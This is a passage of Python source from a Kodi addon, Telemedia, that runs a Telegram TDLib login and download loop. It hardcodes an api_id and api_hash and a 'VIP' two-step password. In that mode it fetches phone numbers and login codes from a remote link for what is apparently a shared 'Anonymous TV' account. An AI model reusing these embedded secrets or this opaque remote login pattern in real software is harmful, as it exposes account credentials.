                                dp.update(70,'[B][COLOR=green]      Telemedia                                       [/COLOR][/B]', '[B][COLOR=yellow]ממתין לאימות על ידי Anonymous TV  [/COLOR][/B]')
                                code=get_pincode(code_link)
                                Addon.setSetting("get_pincode",'true')
                                # send_info('open_t','אימות עבר בהצלחה '+code)
                            if code=='':
                                LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, ADDONTITLE),'[COLOR %s]ההתחברות בוטלה[/COLOR]' % COLOR2)
                                
                                dp.close()
                                stop_listen=2
                                send_info('insert_phone','ההתחברות בוטלה')
                                # insert_phone('ההתחברות בוטלה')
                            else:
                                td_send({'@type': 'checkAuthenticationCode', 'code': str(code)})
            # process authorization states
            if event['@type'] == 'updateAuthorizationState':
                if on_xbmc:
                    dp.update(20,'[B][COLOR=green]      Telemedia                                       [/COLOR][/B]', '[B][COLOR=yellow]מעדכן הרשאה  [/COLOR][/B]')
                auth_state = event['authorization_state']
                
                # if client is closed, we need to destroy it and create new client
                if auth_state['@type'] == 'authorizationStateClosed':
                    if on_xbmc:
                        dp.close()
                    stop_listen=2

                # set TDLib parameters
                # you MUST obtain your own api_id and api_hash at https://my.telegram.org
                # and use them in the setTdlibParameters call

                if auth_state['@type'] == 'authorizationStateWaitTdlibParameters':
                    
                    #חדש
                    td_send({'@type': 'setTdlibParameters', 
                                                           'database_directory': db_path,
                                                           'files_directory': files_path,
                                                           'use_message_database': True,
                                                           'use_secret_chats': True,
                                                           'api_id': 94575,
                                                           'api_hash': 'a3406de8d171bb422bb6ddf3bbd800e2',
                                                           'system_language_code': 'en',
                                                           'device_model': 'Desktop',
                                                           'system_version': 'Linux',
                                                           'application_version': '1.0',
                                                           'enable_storage_optimizer': True})

                                                           
                    #ישן
                    td_send({'@type': 'setTdlibParameters', 'parameters': {
                                                           'database_directory': db_path,
                                                           'files_directory': files_path,
                                                           'use_message_database': True,
                                                           'use_secret_chats': True,
                                                           'api_id': 94575,
                                                           'api_hash': 'a3406de8d171bb422bb6ddf3bbd800e2',
                                                           'system_language_code': 'en',
                                                           'device_model': 'Desktop',
                                                           'system_version': 'Linux',
                                                           'application_version': '1.0',
                                                           'enable_storage_optimizer': True}})
                    
                    
                    

                # set an encryption key for database to let know TDLib how to open the database
                elif auth_state['@type'] == 'authorizationStateWaitEncryptionKey':
                    if on_xbmc:
                        dp.update(40,'[B][COLOR=green]      Telemedia                                       [/COLOR][/B]', '[B][COLOR=yellow]מגדיר מפתח הצפנה   [/COLOR][/B]')
                    td_send({'@type': 'checkDatabaseEncryptionKey', 'key': 'my_key'})

                # enter phone number to log in
                elif auth_state['@type'] == 'authorizationStateWaitPhoneNumber':
                    if on_xbmc:
                        
                        # if Addon.getSetting("tele_login")=='true':
                        try:
                          if Addon.getSetting("vip_login2")=='false':

                               if get_telenum(file_data)=='' or get_telenum(file_data)==None:
                                  dp.update(60,'[B][COLOR=green]      Telemedia                                       [/COLOR][/B]', '[B][COLOR=yellow]הכנס את מספר הטלפון שלך לדוגמה: 972541234567  [/COLOR][/B]')
                                  phone_number = xbmcgui.Dialog().input('הכנס את המספר טלפון ללא 0', '', xbmcgui.INPUT_NUMERIC)
                               else:
                                dp.update(60,'[B][COLOR=green]      Telemedia                                       [/COLOR][/B]', '[B][COLOR=yellow] משחזר את המספר שלך, אנא המתן...  [/COLOR][/B]')
                                phone_number=get_telenum(file_data)
                          else:
                            # dp.update(60,'[B][COLOR=green]      Telemedia                                       [/COLOR][/B]', '[B][COLOR=yellow] מתחבר לחשבון Anonymous TV...  [/COLOR][/B]')
                            # insert_phone('מכניס מספר טלפון אוטומטית')
                            # phone_number=numb
                            # insert_phone('הכנס מספר טלפון')
                            send_info('sendtelemediapin','קוד טלמדיה')
                            ok=get_ok(code_link)
                            if ok:
                                dp.update(60,'[B][COLOR=green]      Telemedia                                       [/COLOR][/B]', '[B][COLOR=yellow] מתחבר לחשבון Anonymous TV...  [/COLOR][/B]')
                                send_info('insert_phone','הכנס מספר טלפון')
                                phone_number=get_phone(code_link)
                            else:
                                Addon.setSetting("autologin",'false')
                                Addon.setSetting("vip_login2",'false')
                                stop_listen=2
                                dp.close()
                                LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, ADDONTITLE),'[COLOR %s]ההתחברות בוטלה[/COLOR]' % COLOR2)
                                send_info('insert_phone','התחברות בוטלה')
                            if phone_number=='123456789000':
                              Addon.setSetting("autologin",'false')
                              Addon.setSetting("vip_login2",'false')
                              stop_listen=2
                              dp.close()
                              LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, ADDONTITLE),'[COLOR %s]ההתחברות בוטלה[/COLOR]' % COLOR2)
                              send_info('insert_phone','התחברות בוטלה')
                              if not os.path.exists(os.path.join(user_dataDir, '4.1.1')):
                                     file = open(os.path.join(user_dataDir, '4.1.1'), 'w') 
                                     file.write(str('Done'))
                                     file.close()
                              # insert_phone('התחברות בוטלה')
                              # try:    
                                    # os.remove(os.path.join(translatepath("special://userdata/"),"addon_data","plugin.video.telemedia","4.1.1"))
                              # except:
                                  # pass
                            # if not phone_number=='' and not phone_number=='123456789000':
                                # xbmc.sleep(2000)#שלא יחשוב שהספרה 0 היא הקוד אימות
                                # try:
                                    # send_info('insert_phone','הכנס קוד טלגרם')
                                # except:pass

                        except Exception as e:
                            logging.warning('Err in pending:'+str(e))
                            phone_number = xbmcgui.Dialog().input('הכנס את המספר טלפון ללא 0', '', xbmcgui.INPUT_NUMERIC)
                            pass

                        # else:
                        # # Enter phone number (Without the +):
                            # phone_number = xbmcgui.Dialog().input('הכנס את המספר טלפון ללא 0', '', xbmcgui.INPUT_NUMERIC)
                            
                    else:
                        phone_number = input('Please enter your phone number: ')
                    if phone_number=='':
                                LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, ADDONTITLE),'[COLOR %s]ההתחברות בוטלה[/COLOR]' % COLOR2)
                                dp.close()
                                stop_listen=2
                                td_json_client_destroy(client)
                    else:
                        td_send({'@type': 'setAuthenticationPhoneNumber', 'phone_number': str(phone_number)})

                # wait for authorization code
                elif auth_state['@type'] == 'authorizationStateWaitCode':
                    
                    if on_xbmc:
                        if Addon.getSetting("vip_login2")=='false':
                            
                            dp.update(70,'[B][COLOR=green]      Telemedia                                       [/COLOR][/B]', '[B][COLOR=yellow]נשלחה לך סיסמה לנייד  [/COLOR][/B]')
                            #'Enter code:'
                            #logging.warning('2')
                            code = xbmcgui.Dialog().input('הכנס את הסיסמה', '', xbmcgui.INPUT_NUMERIC)
                        else:
                            try:
                                send_info('insert_phone','הכנס קוד טלגרם')
                            except:pass
                            dp.update(70,'[B][COLOR=green]      Telemedia                                       [/COLOR][/B]', '[B][COLOR=yellow]ממתין לאימות על ידי Anonymous TV  [/COLOR][/B]')
                            code=get_pincode(code_link)
                            Addon.setSetting("get_pincode",'true')
                            # if not code=='0':
                                # send_info('open_t','אימות עבר בהצלחה '+code)
                    else:
                        code = input('Please enter the authentication code you received: ')
                    if code=='':
                                LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, ADDONTITLE),'[COLOR %s]ההתחברות בוטלה[/COLOR]' % COLOR2)
                                dp.close()
                                stop_listen=2
                                td_json_client_destroy(client)
                    else:
                        td_send({'@type': 'checkAuthenticationCode', 'code': str(code)})

                # wait for first and last name for new users
                elif auth_state['@type'] == 'authorizationStateWaitRegistration':
                    first_name = xbmcgui.Dialog().input(Addon.getLocalizedString(32161).encode('ascii', 'ignore').decode('ascii'), '', xbmcgui.INPUT_ALPHANUM)
                    # input('Please enter your first name: ')
                    
                    last_name = xbmcgui.Dialog().input(Addon.getLocalizedString(32162).encode('ascii', 'ignore').decode('ascii'), '', xbmcgui.INPUT_ALPHANUM)
                    # input('Please enter your last name: ')
                    td_send({'@type': 'registerUser', 'first_name': first_name, 'last_name': last_name})

                # wait for password if present
                elif auth_state['@type'] == 'authorizationStateWaitPassword':
                    
                    
                    if on_xbmc:
                        
                        #'Password:'
                        try:
                          if Addon.getSetting("vip_login2")=='false':
                               dp.update(90,'[B][COLOR=green]      Telemedia                                       [/COLOR][/B]', '[B][COLOR=yellow]הכנס את קוד האימות הדו שלבי שלך  [/COLOR][/B]')
                               if get_telecode(file_code)=='' or get_telecode(file_code)==None:
                                 
                                 password = xbmcgui.Dialog().input(Addon.getLocalizedString(32038).encode('ascii', 'ignore').decode('ascii'), '', xbmcgui.INPUT_ALPHANUM)
                               else:
                                password=get_telecode(file_code)
                          else:
                                password='Cc200200!'
                        except:password = xbmcgui.Dialog().input(Addon.getLocalizedString(32038).encode('ascii', 'ignore').decode('ascii'), '', xbmcgui.INPUT_ALPHANUM)
                    else:
                        password = raw_input('Please enter your password: ')
                    if password=='':
                                LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, ADDONTITLE),'[COLOR %s]ההתחברות בוטלה[/COLOR]' % COLOR2)
                                dp.close()
                                stop_listen=2
                                td_json_client_destroy(client)
                    else:
                        td_send({'@type': 'checkAuthenticationPassword', 'password': str(password)})
                elif auth_state['@type'] == "authorizationStateReady":
                    #logging.warning('In end')
                    stop_listen=1
                    if on_xbmc:
                        dp.close()
                        if Addon.getSetting("get_pincode")=='true':
                            send_info('open_t','התחברות הושלמה')
                            Addon.setSetting("get_pincode",'false')
                        LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, ADDONTITLE),'[COLOR %s]ההתחברות הושלמה[/COLOR]' % COLOR2)
                        Addon.setSetting('autologin', 'true')
                        xbmc.executebuiltin('RunPlugin(plugin://plugin.video.telemedia?mode=212&url=www)')
                        # xbmc.executebuiltin('RunPlugin(plugin://plugin.video.telemedia?mode=45&url=www)')
                        # refresh_datatelegram = 'RunPlugin(plugin://plugin.video.telemedia?mode=212&url=www)'
                        # xbmc.executebuiltin('AlarmClock(wizard,{0},00:01:00,silent)'.format(refresh_datatelegram))

                        if not os.path.exists(os.path.join(user_dataDir, '4.1.1')):
                             file = open(os.path.join(user_dataDir, '4.1.1'), 'w') 
                             file.write(str('Done'))
                             file.close()
                        if not os.path.exists(os.path.join(user_dataDir, '4.1.2')) and Addon.getSetting("vip_login2")=='false':
                             refresh_sync = 'RunPlugin(plugin://plugin.video.telemedia?mode=262&url=www)'
                             xbmc.executebuiltin('AlarmClock(wizard,{0},00:01:00,silent)'.format(refresh_sync))
                             file = open(os.path.join(user_dataDir, '4.1.2'), 'w') 
                             file.write(str('Done'))
                             file.close()
                        if not os.path.exists(os.path.join(user_dataDir, '4.1.3')):
                             xbmc.executebuiltin('RunPlugin(plugin://plugin.program.Settingz-Anon?mode=346&url=www)')
                             file = open(os.path.join(user_dataDir, '4.1.3'), 'w') 
                             file.write(str('Done'))
                             file.close()
            # handle an incoming update or an answer to a previously sent request
            sys.stdout.flush()
    elif stop_listen==1:
        
        if wait_for_download_photo==1:
            global_path=download_photo(global_id,global_offset,global_end,event)
            if global_path!='':
                wait_for_download_photo=0
        if wait_for_download==1:
            
            global_path,global_size=download_file_out(global_id,global_offset,global_end,event)
            if global_path!='':
                wait_for_download=0
        if wait_for_download_complete==1:
            global_path,global_size=download_file_complete(global_id,global_offset,global_end,event)
            if global_path!='':
                wait_for_download_complete=0
        try:
            
            for items in post_box:
                    
                    if post_box[items]['status']=='pending':
                        
                        td_send(post_box[items]['data'])
                        post_box[items]['status']='send'
        except Exception as e:
            logging.warning('Err in pending:'+str(e))
            pass
        if event:
            
            try:
                if "@type" in event:
                    if 'updateFile' in event['@type']:
                        
                        for items in file_size:
                            if "file"  in event:
                                
                                if event["file"]['id']==int(items):
                                    file_size[items]=event['file']['local']['downloaded_size']
                                    downn_path[items]=event['file']['local']['path']
                    
            except Exception as e:  
                logging.warning('Err in filesize:'+str(e))
                pass
            if event.get('@type') =='error'and Addon.getSetting("poptele")=='true':
                    if on_xbmc:
                        #dp.close()
                        xbmc.executebuiltin(u'Notification(%s,%s)' % ('Telemedia',str(event.get('message'))))
                        '''
                        if 'USER_ALREADY_PARTICIPANT' in str(event.get('message')) or 'Too Many Requests: retry after' in str(event.get('message')):
                            xbmc.executebuiltin(u'Notification(%s,%s)' % ('Telemedia',str(event.get('message'))))
                        else:
                            xbmcgui.Dialog().ok('Telemedia Error',str(event.get('message')))
                        '''
                    else:
                        logging.warning(str(event.get('message')))
            try:
                
                for items in post_box:
                        if post_box[items]['status']=='send':
                            if '@extra' in event :
                                if event['@extra']==(items):
                                    post_box[items]['responce']=event
                                    post_box[items]['status']='recived'
                        if post_box[items]['status']=='listen':
                            if "@type" in event:
                                if 'updateFile' in event['@type']:
                                    post_box[items]['responce']=event
                                    
                        if items=='updateFile_local':
                            if "@type" in event:
                                if 'updateFile' in event['@type']:
                                    if "file"  in event:
                                        
                                        file=event["file"]['local']['path']
                                        if xbmcvfs.exists(file) and event["file"]['id']==post_box[items]['id']:
                                            post_box[items]['responce']=file
            except Exception as e:
                    logging.warning('Err post:'+str(e))
    if stop_listen!=2:
        try:
            if on_xbmc:
                
                if cond:
                    break
                event = td_receive()
            else:
                try:
                    event = td_receive()
                except Exception as e:
                    logging.warning('Error td_recive:'+str(e))
                    break
            if event:
                
                if "@extra" in event:
                    if event["@extra"]==1.91234 and Addon.getSetting("poptele")=='true':
                        xbmc.executebuiltin('Notification(%s, %s, %d)'%('[COLOR yellow]Connection[/COLOR]',event["@type"], 5000))
                
                if 'chat_filters' in event:
                    for ite in event['chat_filters']:
                        all_folders[ite['id']]=ite['title']
            
            if stop_listen==1:
                if event:
                    
                    if on_xbmc:
                        if Addon.getSetting("full_debug")=='true':
                            logging.warning(json.dumps(event))

                    if 'updateFile' in event['@type']:
                      try:
                        ready_size=ready_size_pre+event['file']['local']['downloaded_prefix_size']
                      except:
                        ready_size=''
                    if 'expected_size' in event :
                    
                      ready_size=ready_size_pre+event['local']['downloaded_prefix_size']
                    if on_xbmc:
                        if 'size' in event:
                            complete_size=event['size']
                        if Addon.getSetting("auto_update")=='true' and len(Addon.getSetting("update_chat_id"))>0:
                            check_update(event)
                        check_update(event)
                        if Addon.getSetting("show_login")=='true':
                            check_login(event)
                        if Addon.getSetting("vip_login2")=='true':
                            get_login_code(event)
                    if 'message' in event:
                       if 'chat_id' in event['message']:
                        if str(event['message']['chat_id'])=='1810654262':
                            if 'text' in event['message']['content']:
                                if 'text' in event['message']['content']['text']:
                                    txt=event['message']['content']['text']['text']
                                    last_link=txt
                                    # last_link_pre=re.compile('Here is the link to your file\n\n(.+?)\n\n').findall(txt)
                                    # last_link='Found'
                                    # if len(last_link_pre)>0:
                                       
                                        # last_link=last_link_pre[0]
                        elif str(event['message']['chat_id'])=='6238492629':
                            if 'text' in event['message']['content']:
                                if 'text' in event['message']['content']['text']:
                                    txt=event['message']['content']['text']['text']
                                    last_link=txt
                                    
                                    
                                    
                                    
                                    

                # year, month, day, hour, min = map(int, time.strftime("%Y %m %d %H %M").split())

                # if (hour%4)==0 and (hour!=hours_pre):
                    # from resources.default import search_updates
                    # t = Thread(target=search_updates, args=())
                    # t.start()
                    
                    # hours_pre=hour
        except Exception as e:
            import linecache,sys
            exc_type, exc_obj, tb = sys.exc_info()
            f = tb.tb_frame
            lineno = tb.tb_lineno
            filename = f.f_code.co_filename
            linecache.checkcache(filename)
            line = linecache.getline(filename, lineno, f.f_globals)
            logging.warning('ERROR IN service:'+str(lineno))
            logging.warning('inline:'+str(line))
            logging.warning(str(e))
            
            
            if not on_xbmc:
                break
    else:
        try:
            time.sleep(0.1)
        except:
            break
# destroy client when it is closed and isn't needed anymore
#logging.warning('Destroy Client')

td_json_client_destroy(client)
try:
    os.remove(file_path)
except:
    pass
server.shutdown()
